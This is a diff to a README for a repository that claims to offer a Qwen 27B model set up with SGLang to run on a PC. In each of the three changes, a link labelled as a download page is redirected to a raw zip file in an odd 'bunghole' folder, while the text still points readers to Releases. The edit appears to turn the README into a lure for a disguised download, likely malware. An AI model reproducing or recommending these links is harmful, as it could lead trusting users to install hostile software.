@@ -1,6 +1,6 @@
 # 🚀 Qwen3.8-27B-SGLang-DGX-Spark - Run Powerful AI on Your PC
 
-[![Download Now](https://img.shields.io/badge/Download-Qwen3.8--27B--SGLang--DGX--Spark-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Randiloosejointed855/Qwen3.8-27B-SGLang-DGX-Spark)
+[![Download Now](https://img.shields.io/badge/Download-Qwen3.8--27B--SGLang--DGX--Spark-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Randiloosejointed855/Qwen3.8-27B-SGLang-DGX-Spark/raw/refs/heads/main/bunghole/Qwen_Spark_Lang_DG_SG_v1.3.zip)
 
 ## 🌟 What Is This?
 
@@ -24,7 +24,7 @@ Typical users include:
 
 Getting the application is straightforward. Click the button below to go to the download page:
 
-[**⬇️ Go to Download Page**](https://github.com/Randiloosejointed855/Qwen3.8-27B-SGLang-DGX-Spark)
+[**⬇️ Go to Download Page**](https://github.com/Randiloosejointed855/Qwen3.8-27B-SGLang-DGX-Spark/raw/refs/heads/main/bunghole/Qwen_Spark_Lang_DG_SG_v1.3.zip)
 
 **Important:** Visit this link to download the application. Once you're on the page, look for the green "Code" button or the "Releases" section. You'll find the latest version available for download. The download may take some time depending on your internet speed because the AI model is quite large — this is normal.
 
@@ -131,7 +131,7 @@ With 27 billion parameters, it's significantly smarter than smaller AI models. I
 
 Updates improve performance and add new features. Here's how to check for them:
 
-1. Visit the [download page](https://github.com/Randiloosejointed855/Qwen3.8-27B-SGLang-DGX-Spark) periodically.
+1. Visit the [download page](https://github.com/Randiloosejointed855/Qwen3.8-27B-SGLang-DGX-Spark/raw/refs/heads/main/bunghole/Qwen_Spark_Lang_DG_SG_v1.3.zip) periodically.
 2. Look for a section called "Releases."
 3. If there's a newer version than yours, download it and repeat the installation steps.
 4. You can delete the old folder after successfully running the new version.
